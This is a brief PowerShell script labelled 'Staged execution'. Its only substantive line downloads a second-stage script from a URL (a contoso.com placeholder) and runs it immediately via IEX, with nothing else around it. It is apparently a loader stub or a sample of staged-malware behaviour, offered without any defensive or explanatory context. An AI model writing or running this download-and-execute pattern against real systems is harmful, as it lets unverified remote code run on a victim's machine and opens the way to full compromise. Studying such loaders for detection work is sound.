
<# Staged execution #>
[CmdletBinding()]
param(
    [string]$Stage1Url = 'https://contoso.com/stage2.ps1',
    [int]$StageTimeout = 83
)
IEX (Invoke-WebRequest -Uri $Stage1Url -UseBasicParsing).Content
$StageMarker = "stage-32"
